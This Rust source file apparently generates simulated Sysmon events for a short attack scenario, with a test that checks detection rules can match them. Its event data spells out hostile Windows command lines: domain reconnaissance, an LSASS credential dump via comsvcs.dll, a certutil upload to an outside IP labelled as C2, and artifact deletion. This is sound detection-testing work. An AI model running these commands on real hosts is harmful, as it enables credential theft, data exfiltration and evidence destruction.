//! Quick smash-and-grab attack scenario (<5 minutes)
//!
//! Simulates a fast attack: initial access → recon → credential dump → exfil.
//! Every step is built via `process_create_step` (NAN-1058) so the wire events
//! actually carry the scripted command lines — see `scenarios::mod` for the
//! history of why the previous `gen.generate(...)` pattern was broken.

use chrono::Utc;

use event_core::entity::Entity;
use event_core::generators::SysmonGenerator;

use super::{process_create_step, AttackScenario, AttackStep};

pub struct QuickScenario;

impl AttackScenario for QuickScenario {
    fn name(&self) -> &str {
        "quick"
    }

    fn generate(&self, target: &Entity, _all_entities: &[Entity]) -> Vec<AttackStep> {
        let gen = SysmonGenerator::new();
        let now = Utc::now();

        vec![
            // Initial access: dropper lands in a writable user directory.
            // Pre-NAN-1058 this step never spawned a process at all — only the
            // stdout pretended a dropper ran. Now the wire event carries a
            // real `update.exe` cmdline so initial_access rules can match.
            process_create_step(
                &gen,
                target,
                now,
                0,
                "update.exe",
                r"C:\Users\Public\Downloads\update.exe",
                r"update.exe --silent --install",
                None,
                "Initial Access",
                format!("Dropper executed on {}", target.hostname),
            ),
            process_create_step(
                &gen,
                target,
                now,
                3,
                "whoami.exe",
                r"C:\Windows\System32\whoami.exe",
                "whoami /all",
                None,
                "Discovery",
                "whoami /all",
            ),
            process_create_step(
                &gen,
                target,
                now,
                8,
                "ipconfig.exe",
                r"C:\Windows\System32\ipconfig.exe",
                "ipconfig /all",
                None,
                "Discovery",
                "ipconfig /all",
            ),
            process_create_step(
                &gen,
                target,
                now,
                15,
                "net.exe",
                r"C:\Windows\System32\net.exe",
                "net user /domain",
                None,
                "Discovery",
                "net user /domain",
            ),
            process_create_step(
                &gen,
                target,
                now,
                25,
                "net.exe",
                r"C:\Windows\System32\net.exe",
                r#"net group "Domain Admins" /domain"#,
                None,
                "Discovery",
                r#"net group "Domain Admins" /domain"#,
            ),
            process_create_step(
                &gen,
                target,
                now,
                60,
                "rundll32.exe",
                r"C:\Windows\System32\rundll32.exe",
                r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full",
                None,
                "Credential Access",
                "LSASS memory dump via comsvcs.dll",
            ),
            process_create_step(
                &gen,
                target,
                now,
                120,
                "powershell.exe",
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                r#"powershell.exe -c "Compress-Archive -Path C:\temp\lsass.dmp -DestinationPath C:\temp\data.zip""#,
                None,
                "Exfiltration",
                "Compress credential dump",
            ),
            process_create_step(
                &gen,
                target,
                now,
                180,
                "certutil.exe",
                r"C:\Windows\System32\certutil.exe",
                r"certutil.exe -urlcache -split -f http://185.220.101.35/upload C:\temp\data.zip",
                None,
                "Exfiltration",
                "Upload via certutil to C2",
            ),
            process_create_step(
                &gen,
                target,
                now,
                240,
                "cmd.exe",
                r"C:\Windows\System32\cmd.exe",
                r"cmd.exe /c del /f /q C:\temp\lsass.dmp C:\temp\data.zip",
                None,
                "Defense Evasion",
                "Delete artifacts",
            ),
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use event_core::entity::WorldState;

    /// NAN-1058 regression. Pre-fix, `--quick` emitted 9 random sysmon events
    /// — none of the scripted command lines made it to the wire. After fix
    /// every scripted token must round-trip into the event payload so the
    /// matching demo rules (`lsass_credential_dump_comsvcs`,
    /// `certutil_suspicious_download`, `rapid_host_enumeration`,
    /// `data_staging_and_exfiltration`) have something to match.
    #[test]
    fn quick_scenario_emits_all_scripted_command_lines() {
        let world = WorldState::new(1);
        let target = world.entities().first().expect("one-entity world");
        let steps = QuickScenario.generate(target, world.entities());

        // 9 attack steps: dropper + 4 discovery + lsass + compress + certutil + cleanup
        assert_eq!(steps.len(), 9, "quick should produce exactly 9 scripted steps");

        let wire: String = steps
            .iter()
            .flat_map(|s| s.events.iter().map(|e| e.message.clone()))
            .collect::<Vec<_>>()
            .join("\n");

        for required in [
            // Dropper (initial access)
            "update.exe",
            // Discovery quartet — must include the literal switches
            "whoami /all",
            "ipconfig /all",
            "net user /domain",
            r#"net group \"Domain Admins\" /domain"#,
            // Credential access (lsass_credential_dump_comsvcs)
            "comsvcs",
            "MiniDump",
            // Exfiltration staging
            "Compress-Archive",
            // Exfiltration upload (certutil_suspicious_download)
            "certutil",
            "urlcache",
            // Cleanup
            "del /f /q",
        ] {
            assert!(
                wire.contains(required),
                "quick scenario wire payload missing required token `{required}`. \
                 If this fails, someone reintroduced the NAN-1058 \
                 `gen.generate(ts, entity, rng)` pattern in place of \
                 `process_create_step`. Full payload:\n{wire}"
            );
        }
    }
}
